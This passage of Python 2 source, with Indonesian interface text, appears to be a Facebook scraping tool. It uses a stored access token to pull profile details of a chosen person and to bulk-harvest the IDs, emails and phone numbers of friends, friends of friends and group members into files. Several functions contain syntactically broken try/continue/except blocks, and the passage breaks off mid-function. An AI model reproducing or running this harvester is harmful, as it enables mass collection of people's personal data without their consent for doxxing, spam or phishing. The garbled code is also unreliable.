    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('reset')
    print logo
    aid = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID \x1b[1;97m/\x1b[1;92mNama \x1b[1;91m: \x1b[1;97m')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mLoading \x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for i in cok['data']:
        if not aid in i['name']:
            if aid in i['id']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                print 42 * '\x1b[1;97m\xe2\x95\x90'
                
                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m          : ' + z['name']
                except KeyError:
                    print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m          : \x1b[1;91mNot found'

                
                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
                except KeyError:
                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mNot found'

                
                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
                except KeyError:
                    print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mNot found'

                
                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mTelephone\x1b[1;97m     : ' + z['mobile_phone']
                except KeyError:
                    print '\x1b[1;91m[?] \x1b[1;92mTelephone\x1b[1;97m     : \x1b[1;91mNot found'

                
                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLokasi\x1b[1;97m      : ' + z['location']['name']
                except KeyError:
                    print '\x1b[1;91m[?] \x1b[1;92mLokasi\x1b[1;97m      : \x1b[1;91mNot found'

                
                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mTanggal lahir\x1b[1;97m : ' + z['birthday']
                except KeyError:
                    print '\x1b[1;91m[?] \x1b[1;92mTanggal lahir\x1b[1;97m : \x1b[1;91mNot found'

                
                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mSekolah\x1b[1;97m        : '
                    for q in z['education']:
                        
                        try:
                            print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
                        continue
                        except KeyError:
                            print '\x1b[1;91m                   ~ \x1b[1;91mNot found'
                            continue
                        

                except KeyError:
                    pass

                raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
                menu()
                continue
            print '\x1b[1;91m[\xe2\x9c\x96] Id Tidak Ada'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
            menu()
            return None


def dump():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('reset')
    print logo
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;93m{\x1b[1;95m01\x1b[1;93m}\x1b[1;92m Dapatkan ID dari teman'
    print '\x1b[1;93m{\x1b[1;95m02\x1b[1;93m}\x1b[1;92m Dapatkan ID teman dari teman'
    print '\x1b[1;93m{\x1b[1;95m03\x1b[1;93m}\x1b[1;92m Dapatkan ID dari member group'
    print '\x1b[1;93m{\x1b[1;95m04\x1b[1;93m}\x1b[1;92m Dapatkan email member group'
    print '\x1b[1;93m{\x1b[1;95m05\x1b[1;93m}\x1b[1;92m Dapatkan nomor dari member group'
    print '\x1b[1;93m{\x1b[1;95m06\x1b[1;93m}\x1b[1;92m Dapatkan email teman'
    print '\x1b[1;93m{\x1b[1;95m07\x1b[1;93m}\x1b[1;92m Dapatkan email teman dari teman'
    print '\x1b[1;93m{\x1b[1;95m08\x1b[1;93m}\x1b[1;92m Dapatkan teman nomor phone teman'
    print '\x1b[1;93m{\x1b[1;95m09\x1b[1;93m}\x1b[1;92m Dapatkan teman nomor phone teman dari teman'
    print '\x1b[1;93m{\x1b[1;95m00\x1b[1;93m}\x1b[1;91m Keluar'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    dump_pilih()


def dump_pilih():
    cuih = raw_input('\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m>>> \x1b[1;97m')
    if cuih == '':
        print '\x1b[1;91m[!] Salah pilih yang benar'
        dump_pilih()
    elif cuih == '1':
        id_teman()
    elif cuih == '2':
        idfrom_teman()
    elif cuih == '3':
        id_member_grup()
    elif cuih == '4':
        em_member_grup()
    elif cuih == '5':
        no_member_grup()
    elif cuih == '6':
        email()
    elif cuih == '7':
        emailfrom_teman()
    elif cuih == '8':
        nomor_hp()
    elif cuih == '9':
        hpfrom_teman()
    elif cuih == '0':
        menu()
    else:
        print '\x1b[1;91m[!] Salah pilih yang benar'
        dump_pilih()


def id_teman():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        os.system('clear')
        print logo
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mDapatkan semua id teman \x1b[1;97m...')
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        bz = open('out/id_teman.txt', 'w')
        for a in z['data']:
            idteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(idteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
            sys.stdout.flush()
            time.sleep(0.0001)
        
        bz.close()
        print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSelesa mendapkan id\x1b[1;97m....'
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m%s' % len(idteman)
        done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSimpan file diluar folder nama\x1b[1;91m :\x1b[1;97m ')
        os.rename('out/id_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile save \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBmKeluar \x1b[1;91m]')
        dump()
    except IOError:
        print '\x1b[1;91m[!] Terjadi kesalahan saat membuat file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Berhenti'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mkeluar \x1b[1;91m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
        keluar()



def idfrom_teman():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        os.system('reset')
        print logo
        idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID teman \x1b[1;91m: \x1b[1;97m')
        
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;91m :\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;91m[!] Teman tidak ada'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mDapatkan semua ID teman dari teman \x1b[1;97m...')
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        bz = open('out/id_teman_from_teman.txt', 'w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(idfromteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
            sys.stdout.flush()
            time.sleep(0.0001)
        
        bz.close()
        print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSelesai memdaptkan ID \x1b[1;97m....'
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m%s' % len(idfromteman)
        done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSave file di luar folder nama\x1b[1;91m :\x1b[1;97m ')
        os.rename('out/id_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile save \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except IOError:
        print '\x1b[1;91m[!] Terjadi kesalahan saat membuat file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Berhenti'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
        keluar()



def id_member_grup():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        os.system('clear')
        print logo
        id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID group \x1b[1;91m:\x1b[1;97m ')
        
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;91m[!] Group tidak ada'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
            dump()

        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;97mMendaptan ID member group\x1b[1;97m...')
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        bz = open('out/member_grup.txt', 'w')
        re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999999&access_token=' + toket)
        s = json.loads(re.text)
        for a in s['data']:
            idmem.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(idmem)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
            sys.stdout.flush()
            time.sleep(0.0001)
        
        bz.close()
        print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSelesai mendaptkan ID \x1b[1;97m....'
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m%s' % len(idmem)
        done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSave file di luar folder nama\x1b[1;91m :\x1b[1;97m ')
        os.rename('out/member_grup.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile save \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except IOError:
        print '\x1b[1;91m[!] Terjadi kesalahan saat membuat file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Berhenti'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
        keluar()



def em_member_grup():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        os.system('clear')
        print logo
        id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID group \x1b[1;91m:\x1b[1;97m ')
        
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;91m[!] Group tidak ada'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
            dump()

        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMendapatkan email member group \x1b[1;97m...')
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        bz = open('out/em_member_grup.txt', 'w')
        re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
        s = json.loads(re.text)
        for a in s['data']:
            x = requests.get('https://graph.facebook.com/' + a['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            
            try:
                emmem.append(z['email'])
                bz.write(z['email'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(emmem)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['email'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
            continue
            except KeyError:
                continue
            

        
        bz.close()
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSuccessfully get email from member group \x1b[1;97m....'
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal Email \x1b[1;91m: \x1b[1;97m%s' % len(emmem)
        done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSave file di luar folder nama\x1b[1;91m :\x1b[1;97m ')
        os.rename('out/em_member_grup.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile save \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except IOError:
        print '\x1b[1;91m[!] Terjadi kesalahan saat membuat file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Berhenti'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
        keluar()



def no_member_grup():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        os.system('clear')
        print logo
        id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID group \x1b[1;91m:\x1b[1;97m ')
        
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;91m[!] Group tidak ada'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
            dump()

        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMendapatkan nomor phone member group \x1b[1;97m...')
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        bz = open('out/no_member_grup.txt', 'w')
        re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
        s = json.loads(re.text)
        for a in s['data']:
            x = requests.get('https://graph.facebook.com/' + a['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            
            try:
                nomem.append(z['mobile_phone'])
                bz.write(z['mobile_phone'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(nomem)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['mobile_phone'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
            continue
            except KeyError:
                continue
            

        
        bz.close()
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSelesai mendapatkan nomor phone member group \x1b[1;97m....'
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal Number \x1b[1;91m: \x1b[1;97m%s' % len(nomem)
        done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSave file diluar folder nama\x1b[1;91m :\x1b[1;97m ')
        os.rename('out/no_member_grup.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except IOError:
        print '\x1b[1;91m[!] Terjadi kesalahan saat membuat file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mkeluar \x1b[1;91m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Stopped'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
        keluar()



def email():
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        os.system('clear')
        print logo
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        a = json.loads(r.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMendapatkan semua email teman \x1b[1;97m...')
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        bz = open('out/email_teman.txt', 'w')
        for i in a['data']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            
            try:
                em.append(z['email'])
                bz.write(z['email'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(em)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['email'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
            continue
            except KeyError:
                continue
            

        
        bz.close()
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSelesai mendapatkan email \x1b[1;97m....'
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal Email \x1b[1;91m: \x1b[1;97m%s' % len(em)
        done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSave file diluar folder name\x1b[1;91m :\x1b[1;97m ')
        os.rename('out/email_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except IOError:
        print '\x1b[1;91m[!] Terjadi kesalahan saat membuat file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] berhenti'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
        keluar()



def emailfrom_teman():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        os.system('clear')
        print logo
        idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman dari Teman \x1b[1;91m: \x1b[1;97m')
        
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;91m[!] ID teman tidak ada'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        a = json.loads(r.text)
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMendapatkan ID teman dari teman\x1b[1;97m...')
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        bz = open('out/em_teman_from_teman.txt', 'w')
        for i in a['data']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            
            try:
                emfromteman.append(z['email'])
                bz.write(z['email'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(emfromteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['email'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
            continue
            except KeyError:
                continue
            

        
        bz.close()
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSelesai mendaptkan email \x1b[1;97m....'
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal Email \x1b[1;91m: \x1b[1;97m%s' % len(emfromteman)
        done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSave file diluar folder nama\x1b[1;91m :\x1b[1;97m ')
        os.rename('out/em_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except IOError:
        print '\x1b[1;91m[!] Terjadi kesalahan saat membuat file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Berhenti'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
        keluar()



def nomor_hp():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        os.system('clear')
        print logo
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMendapatkan semua number phone teman \x1b[1;97m...')
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        url = 'https://graph.facebook.com/me/friends?access_token=' + toket
        r = requests.get(url)
        z = json.loads(r.text)
        bz = open('out/nomer_teman.txt', 'w')
        for n in z['data']:
            x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            
            try:
                hp.append(z['mobile_phone'])
                bz.write(z['mobile_phone'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(hp)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + z['mobile_phone'] + ' | ' + z['name'] + '\n',
                sys.stdout.flush()
                time.sleep(0.0001)
            continue
            except KeyError:
                continue
            

        
        bz.close()
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSulesai mendapatkan number \x1b[1;97m....'
        print '\r\x1b[1;91m[+] \x1b[1;92mTotal Number \x1b[1;91m: \x1b[1;97m%s' % len(hp)
        done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSave file diluar folder nama\x1b[1;91m :\x1b[1;97m ')
        os.rename('out/nomer_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except IOError:
        print '\x1b[1;91m[!] Terjadi kesalahan saat membuat file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m[!] Berhenti'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
        keluar()



def hpfrom_teman():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        os.system('clear')
        print logo
        idt = raw_input('\x1b[1;91m[+] \x1b[1;92Masukan ID teman \x1b[1;91m: \x1b[1;97m')
        
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;91m :\x1b[1;97m ' + op['name']
        except KeyError:
            print '\x1b[1;91m[!] ID teman tidak ada'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKeluar \x1b[1;91m]')
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        a = json.loads(r.text)
